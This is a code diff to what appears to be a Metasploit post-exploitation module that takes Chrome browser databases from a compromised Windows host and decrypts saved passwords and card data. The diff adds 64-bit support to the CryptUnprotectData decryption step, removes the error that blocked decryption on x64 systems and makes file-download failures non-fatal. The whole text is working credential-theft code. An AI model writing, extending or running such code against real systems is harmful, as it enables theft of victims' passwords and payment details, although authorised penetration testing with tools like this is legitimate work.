@@ -27,7 +27,12 @@ class Metasploit3 < Msf::Post
 			'Version'              => '$Revision$',
 			'Platform'             => ['windows'],
 			'SessionTypes'         => ['meterpreter'],
-			'Author'               => ['Sven Taute', 'sinn3r']
+			'Author'               =>
+				[
+					'Sven Taute', #Original (Meterpreter script)
+					'sinn3r',     #Metasploit post module
+					'Kx499',      #x64 support
+				]
 		))
 		register_options(
 			[
@@ -63,10 +68,22 @@ class Metasploit3 < Msf::Post
 		mem = process.memory.allocate(1024)
 		process.memory.write(mem, data)
 
-		addr = [mem].pack("V")
-		len = [data.length].pack("V")
-		ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
-		len, addr = ret["pDataOut"].unpack("V2")
+		if session.sys.process.each_process.find { |i| i["pid"] == pid} ["arch"] == "x86"
+
+			addr = [mem].pack("V")
+			len = [data.length].pack("V")
+			ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
+			len, addr = ret["pDataOut"].unpack("V2")
+
+		else
+
+			addr = [mem].pack("Q")
+			len = [data.length].pack("Q")
+			ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
+			len, addr = ret["pDataOut"].unpack("Q2")
+
+		end
+
 		return "" if len == 0
 		decrypted = process.memory.read(addr, len)
 		return decrypted
@@ -81,25 +98,20 @@ class Metasploit3 < Msf::Post
 		)
 
 		@chrome_files.each do |item|
-			break if item[:sql] == nil
-			break if item[:raw_file] == nil
+			next if item[:sql] == nil
+			next if item[:raw_file] == nil
 
 			db = SQLite3::Database.new(item[:raw_file])
 			begin
 				columns, *rows = db.execute2(item[:sql])
 			rescue
-				break
+				next
 			end
 			db.close
  
 			rows.map! do |row|
 				res = Hash[*columns.zip(row).flatten]
 				if item[:encrypted_fields] && session.sys.config.getuid != "NT AUTHORITY\\SYSTEM"
-
-					if @host_info['Architecture'] =~ /x64/
-						print_error("Decryption not supported on a 64-bit OS")
-						break
-					end
 
 					item[:encrypted_fields].each do |field|
 						name = (res["name_on_card"] == nil) ? res["username_value"] : res["name_on_card"]
@@ -113,10 +125,9 @@ class Metasploit3 < Msf::Post
 						end
 					end
 				end
-				res
 			end
 		end
-		
+
 		if secrets != ""
 			path = store_loot("chrome.decrypted", "text/plain", session, decrypt_table.to_s, "decrypted_chrome_data.txt", "Decrypted Chrome Data")
 			print_status("Decrypted data saved in: #{path}")
@@ -136,16 +147,16 @@ class Metasploit3 < Msf::Post
 				x = session.fs.file.stat(remote_path)
 			rescue
 				print_error("#{f} not found")
-				break
+				next
 			end
-			
+
 			# Store raw data
 			local_path = store_loot("chrome.raw.#{f}", "text/plain", session.tunnel_peer, "chrome_raw_#{f}")
 			raw_files[f] = local_path
 			session.fs.file.download_file(local_path, remote_path)
 			print_status("Downloaded #{f} to '#{local_path}'")
 		end
-		
+
 		#Assign raw file paths to @chrome_files
 		raw_files.each_pair do |raw_key, raw_path|
 			@chrome_files.each do |item|
